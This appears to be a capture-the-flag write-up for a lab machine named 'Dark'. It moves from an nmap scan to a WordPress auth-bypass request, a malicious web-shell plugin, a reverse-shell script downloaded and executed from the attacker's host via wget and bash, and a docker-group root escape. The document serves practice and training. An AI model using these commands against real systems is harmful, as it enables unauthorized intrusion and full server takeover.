# Dark

## Enumeration&#x20;

### Nmap scan&#x20;

```
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:fa:00:85:4c:0d:97:79:7b:46:e4:86:1b:18:72:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLam/VK6YR6qok5qjxAOMQIMtbsBuqTMCcwN54GLSUj647RGe9FJoID+In4rw7Uq5IonEyDaltg+HosxF31l1FU=
|   256 ea:8d:af:2f:ec:15:d9:32:c0:94:6f:09:03:49:60:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILg3Yms7k9Fk2ZLcerD3FB6RxonH+HtTOpefF4dky0+D
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
|_http-generator: WordPress 6.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Dark &#8211; Just another WordPress site
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
```



### Port 80 - HTTP

During the reconnaissance phase, an nmap scan revealed that the web application is running WordPress version 6.0. This specific version contains a known vulnerability that allows an authenticated user to escalate privileges and gain full administrative access to the platform.

#### CVE- [https://nvd.nist.gov/vuln/detail/cve-2026-23550](https://nvd.nist.gov/vuln/detail/cve-2026-23550)



```
Command:-'https://10.0.22.50/api/modular-connector/login/anything?origin=mo&type=foo'
```

#### PoC- [https://hurayraiit.com/blog/cve-2026-23550-critical-privilege-escalation-in-wordpress-modular-ds-plugin-cvss-10/](https://hurayraiit.com/blog/cve-2026-23550-critical-privilege-escalation-in-wordpress-modular-ds-plugin-cvss-10/)



Authenticated as admin&#x20;

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

Using the administrative access, a custom WordPress plugin containing a basic web shell (shell.php) was crafted to execute system commands via a URL parameter (cmd). The plugin file was compressed into shell.zip to match the standard format required by the WordPress plugin upload mechanism.

<figure><img src="../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

Activate the plugin after successful login

<figure><img src="../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

Once the malicious plugin archive was successfully uploaded and activated through the administrative dashboard, navigating directly to the plugin's path on the server allowed remote command execution (RCE) via the cmd parameter.

<figure><img src="../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

A bash reverse shell script (file.sh) was crafted and hosted locally via a Python web server. By leveraging the web shell, the target server downloaded this script, and standard file permissions were modified to allow its execution to establish a stable reverse connection.

<figure><img src="../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

```
Command:-
python3 -m http.server 80
wget http://vpnip/file.sh
chmod 777 file.sh
bash file.sh
```

<figure><img src="../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>



### User.txt

Found user.txt file in /var/www path&#x20;

<figure><img src="../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>



### Privilege Escalation&#x20;

The www-data user was found to be a member of the docker group, allowing for a container-based privilege escalation. Executing the command mounted the host system's root directory, successfully escaping the container to grant full root access.

```
Command:- docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

<figure><img src="../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>









